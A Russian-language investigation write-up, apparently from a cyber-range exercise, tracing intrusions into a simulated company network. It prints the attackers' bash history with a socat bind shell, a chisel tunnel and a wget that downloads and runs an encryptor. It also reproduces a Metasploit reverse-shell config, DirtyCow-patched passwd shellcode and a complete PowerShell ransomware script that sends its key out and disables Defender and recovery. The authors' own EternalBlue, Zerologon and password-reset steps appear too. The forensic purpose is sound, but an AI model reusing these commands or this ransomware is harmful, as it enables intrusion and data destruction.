# Linux
## 10.x.2.10
```
Nmap scan report for 10.18.2.10
Host is up (0.0080s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    nginx 1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Видим открытый ssh, mysql и http сервер. Открыв его в браузере видим стандартный сайт WordPress. Идем в `/wp-admin`, пробуем удачу с `admin:admin` и у нас выходит. Пробегаемся по менюшкам и самым необычным является плагин WP FileManager, который позволяет загрузить на сервер php reverse shell. Получив reverse shell, запускаем linpeas, откуда находим в sudoers весьма занимательную строчку:
```
/etc/sudoers:www-data ALL=(ALL:ALL) NOPASSWD: /usr/bin/python
``` 
То есть, мы можем запустить python от root. Недолго думая запускаем `sudo python -c 'import pty; pty.spawn("/bin/sh")'` и получаем права root.

###  Хеши и пароли
По `/etc/passwd` и `/etc/shadow` с помощью John получаем пароль от admin: `John316`. 

### Ключи...
Гуляя по системе находим необычный файл `/home/cadm/wp-file-manager/cloud.pem`. Там приватный RSA ключ. Так же у этого же пользователя есть `.ssh/authorized_keys`. Пробуем `ssh-keygen -y -e -f` и убеждаемся, что эта пара ключей до скончания времен.

## 10.x.2.11
```Nmap scan report for 10.18.2.12
Host is up (0.0011s latency).
Not shown: 985 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
79/tcp    open  finger
106/tcp   open  pop3pw
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

Попробуем зайти с кредами от 10.x.2.10 и нам везет. Запускаем linpeas и видим нехорошие настройки sudo. `sudo -i` и у нас снова root доступ.



### Проникновение
Первым флажочком компроментации является интересная запись в логах:
```
127.0.0.1:80 10.18.200.50 - - [05/Mar/2022:15:06:49 +0300] "GET /?q=user/password HTTP/1.1" 200 33649 "-" "drupalgeddon2"
```
Оказывается, на нашем сервере есть уязвимость в Drupal. Сверяем версии и действительно подходит (еще эту уязвимость выдал OpenVAS). 
IP адрес атакующего `10.18.200.50`.

### Шифрование
Осматривая систему находим `/var/www/html`. Там, помимо сайта, лежат много файлов с расширением 
`.encr`.  Похоже, что имеем дело с шифрованием.

В `/root/,bashrc_history`:
```
setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit  
id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit  
setsid /var/www/html/chisel client 10.18.200.50:8083 R:socks 2>1 > /dev/null && exit  
wget http://10.18.200.50/encr.sh -O /var/www/html/encr.sh;exit  
chmod -R 777 /var/www/html;exit  
/var/www/html/encr.sh;exit  
rm -f /var/www/html/shell.php;exit  
rm -f /var/www/html/encr.sh;exit  
rm -f /var/www/html/sploit.c;exit  
pkill -9 -f socat  
pkill -9 -f socat
```
Явный вызов шифровальщика.
### /usr/bin/passwd
При попытке поменять пароль у root замечаем странное поведение утилиты `passwd`. Забираем ее себе и смотрим дисасм:
```
xor rdi, rdi
push 0x69
pop rax
syscall
push 0x3b
pop rax
cdq
movabs rbx, 0x68732f6e69622f ; "/bin/sh"
```
Выглядит подозрительно... Пробуем запустить (установим suid и пользователя в root) и получаем root шелл.

### /var/www/html/sploit
Так же в этой же папке найден подозрительный файл `/var/www/html/sploit`. Снова скачиваем, открываем в r2. Видим несколько приятных строчек: `/usr/bin/passwd`, `DitryCow`, `cp %s /tmp/bak`.   Изучая в каком порядке эти строчки появляются (а также по поведению программы `passwd`) делаем вывод, что эта бинарь перезаписывает passwd, чтобы та давала рутовый шелл.

#### Interesting fact
При попытке восстановить удаленные файлы находим интересный файл `/var/www/html/44302.c`. Там лежит эксплоит, использующий CVE-2017-7533. А его скомпилированная версия в `/var/www/html/exploit`.
#### Interesting fact 2
В этих же восстановленных файлах найден скрипт metasploit:
```
set target 0  
set payload python/meterpreter/reverse_http  
set srvhost 0.0.0.0  
set srvport 8080  
set lhost 172.18.0.200  
set lport 4444  
set uripath evil  
exploit
```
Как минимум, мы знаем, что хакер использует metasploit.

### Summary about hacking
Хакер воспользовался уязвимостью в Drupal, чтобы загрузить reverse shell и файл `ditrycow.c`. Затем он прямо на атакуемой машине компилирует `sploit`, запускает его и перезаписывает `/usr/bin/passwd`. Через нее он получает root доступ к машине. Через хитрые трюки с socat и chisel он получает прокси к себе, скачивает шифровальщик, шифрует данные и убегает, немного прибирая за собой. Правда, он забыл почистить логи и вернуть `passwd` на место (что странно, в `/tmp/bak` тоже лежит поломанная версия `passwd`).

## 10.x.2.53
Тут все точно так же, как и на 10.x.2.11. Подключаемся как admin и входим через sudo --- root доступ готов.

## 10.x.1.254
Следуя хинту, пытаемся всякими возможными подключиться туда. `admin:John316` не подходит... Вспоминаем, что на 10.x.2.10 нашли пару ключей RSA. И на этот раз нам удается с их помощью подключиться к системе. Снова запускаем linpeas и снова неправильная настройка sudo. `sudo -i`  and we are root again.
 Немного изучая машину, понимаем, что она имеет 6 сетевых интерфейсов (не считая loopback): 10.x.1.(10,11,254); 10.x.(2,3,4,5,6).1.

## 10.x.6.254
Сканируя сети от фаерволла , находим машину 10.x.6.254. С ней снова прокатывает ключ с ключом cadm. Получаем доступ, снова срабатывает `sudo -i`.  Смотрим интерфейсы: 10.x.6.254, 10.x.(8,239,240).1. Сказали, что машинка бесполезна... Поверим.

## 10.x.8.(1,2,3,4)
Какие-то служебные машинки...

## 10.x.240.(5,6,9,10)
Тоже можно войти с ключом cadm, выполнить `sudo -i` и получить root доступ. На всех них крутится Java сервис SIED-2.3.jar

# Windows
## 10.x.2.12
```
Nmap scan report for 10.18.2.12  
Host is up (0.0051s latency).  
Not shown: 988 closed tcp ports (conn-refused)  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH for_Windows_8.6 (protocol 2.0)    
25/tcp open smtp SLmail smtpd 5.5.0.4433
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
3389/tcp open ssl/ms-wbt-server?   
49152/tcp open msrpc Microsoft Windows RPC  
49153/tcp open msrpc Microsoft Windows RPC  	
49154/tcp open msrpc Microsoft Windows RPC  
49155/tcp open msrpc Microsoft Windows RPC  
49156/tcp open msrpc Microsoft Windows RPC  
49157/tcp open msrpc Microsoft Windows RPC  
Service Info: Host: ling-slmail; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Действуя по правилу "видишь винду --- пробуй EternalBlue"(винду с SMB1, конечно же), пробуем через metasploit (`exploit/windows/smb/ms17_010_eternalblue`) получить доступ. У нас получается получить meterpreter сессию. Несложным скриптом (сохраненным в CP866):
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net user Администратор 1357986Ui!
net user Администратор /active:yes
```
Включаем RDP, меняем пароль локального администратора и активируем его. Подключаемся по RDP и готово --- у нас администраторский доступ на машину.

## 10.x.4.(8,10), 10.x.239.(5,6), 10.x.240.14
Тоже EternalBlue, тот же скрипт для получения прав админа...

## 10.x.3.10
При изучении логов с 10.x.1.249 мы нашли попытки использования CVE-2020-1472 на 10.x.3.10 и решили повторить. Нашли в metasploit auxiliary/admin/dcerpc/cve_2020_1472_zerologon, с его помощью сбросили пароль на NS2$, имея доступ к NS2$, получили хеши пользователей AD с помощью auxiliary/gather/windows_secrets_dump и подобрали пароль от COMPANY\Administrator, тем самым получили доступ ко всем компьютерам в домене

## 10.x.239.6
Подключаемся, находим скрипт шифрования. Читаем, понимаем, что это шифровальщик:
```ps
set-strictMode -version 2.0
function Ransom
{

Param(
    [Parameter(Position = 0)]
    [String]
    $IP='127.0.0.1'
    )

    $aesManaged=new-object "System.Security.Cryptography.AesManaged";
    $aesManaged.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $aesManaged.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;
    $aesManaged.BlockSize=128;
    $aesManaged.KeySize=256;
    $aesManaged.GenerateKey();
    $IV =  [System.Convert]::ToBase64String($aesManaged.IV);
    $key = [System.Convert]::ToBase64String($aesManaged.Key);

    $URL="http://$IP/key=$Key&iv=$IV&pc=$env:computername";
    try { Invoke-WebRequest $URL } catch {
        $_.Exception.Response.StatusCode.Value__}

    $background = "http://$IP/wall.jpg"
    Invoke-WebRequest -Uri $background -OutFile "/users/$env:USERNAME/wall.jpg"
    Start-Sleep -s 2
    $wallpaper = "C:/users/$env:USERNAME/wall.jpg"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
    Start-Sleep -s 2
    rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False

    vssadmin delete shadows /all /quiet;
    spsv vss -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode) -ne "Disabled"){
    set-service vss -StartupType Disabled};

    bcdedit /set recoveryenabled No|Out-Null;
    bcdedit /set bootstatuspolicy ignoreallfailures|Out-Null;

    spsv Wscsvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wscsvc'").StartMode) -ne "Disabled"){
    set-service Wscsvc -StartupType Disabled};
    spsv WinDefend -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WinDefend'").StartMode) -ne "Disabled"){
    set-service WinDefend -StartupType Disabled};
    spsv Wuauserv -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wuauserv'").StartMode) -ne "Disabled"){
    set-service Wuauserv -StartupType Disabled};
    spsv BITS -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='BITS'").StartMode) -ne "Disabled"){
    set-service BITS -StartupType Disabled};
    spsv ERSvc -ErrorAction SilentlyContinue;
    spsv WerSvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WerSvc'").StartMode) -ne "Disabled"){
    set-service WerSvc -StartupType Disabled};

    Write-Output "Encryption phase" 

    $encryptor=$aesManaged.CreateEncryptor();
    $directory = "C:\Share"
    $files=gci $directory -Recurse -Include *.txt,*.pdf,*.docx,*.doc,*.jpg;
    foreach($file in $files) {
        $bytes=[System.IO.File]::ReadAllBytes($($file.FullName));
        $encryptedData=$encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData=$aesManaged.IV + $encryptedData;
        [System.IO.File]::WriteAllBytes($($file.FullName+".crpt"),$fullData);
        Remove-Item $file;
    }
}
```
Собственно, оно шифрует файлы, отключает восстановление и ставит обоину.

# Hacker story
> Эта история является вольным пересказом логов Suricata `/var/log/suricata/fast.log.1.gz`, 
> дополенная знаниями полученными из других источников

На календаре пятое марта, весна.
Жили-были... Жило-было предприятие "Энергосвет". Сидели, работали, неправильно настраивали безопасность своей сети. И однажды к ним решил заявиться злорадный хакер (10.x.200.50).
Сканил сеточки, и решил вцепиться в 10.x.2.10 и 10.x.2.11.
Первую машину, вероятно, взломал он легко, но никаких негативных последствий не обнаружили. Видимо, на машине и правда нечего делать.
После же, он натравил свои когти на 10.x.2.11. Судя по количеству логов и различным типам атак, он использовал какой-то автоматизированный способ атак. Сервер уязвим к Drupalgeddon, видимо, им хацкер и воспользовался.
> Далее по данным с машины 10.x.2.11

Загрузил php reverse shell, с его помощью загрузил dirtycow.c, скомпилировал на этой же машине. Этот зловредик использует уязвимость DitryCow (кто бы догадался), и перезаписывает файл /usr/bin/passwd, чтобы последний давал root шелл.
Получив его, неприятель загрузил с себя скрипт для шифрования файлов и зашифровал некоторые файлы.

> Снова к логам Suricata

Получив доступ к 10.x.2.11 с нее он пытается провести атаку на контроллер домена 10.x.3.10, пытаясь применить Zerologon и DCSync attack.

> PS. Zerologon срабатывает

> Дальнейший мой рассказ со слов 10.x.239.6

У него получилось получить пароль доменного администратора, с его помощью он зашел на АРМ 10.x.239.6. Там он загрузил скрипт Ranson.ps1, который встроенными средствами Windows шифрует файлы, а ключи отправляет на сервер злоумышленника.
